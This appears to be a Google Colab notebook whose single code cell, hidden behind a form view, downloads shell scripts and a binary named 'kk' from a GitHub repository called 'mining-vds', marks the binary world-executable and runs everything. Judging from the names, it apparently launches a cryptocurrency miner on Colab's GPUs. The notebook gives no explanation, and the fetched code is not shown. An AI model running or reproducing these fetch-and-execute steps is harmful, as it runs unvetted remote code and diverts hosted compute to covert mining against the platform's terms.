{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "kekew",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "7Di3LTW84O1i",
        "cellView": "form"
      },
      "source": [
        "!ls",
        "!wget https://raw.githubusercontent.com/nedogimov/mining-vds/main/cudaplugin.sh",
        "!bash cudaplugin.sh",
        "!wget https://raw.githubusercontent.com/nedogimov/mining-vds/main/kk",
        "!chmod 777 kk",
        "!wget https://raw.githubusercontent.com/nedogimov/mining-vds/main/start.sh",
        "!bash start.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
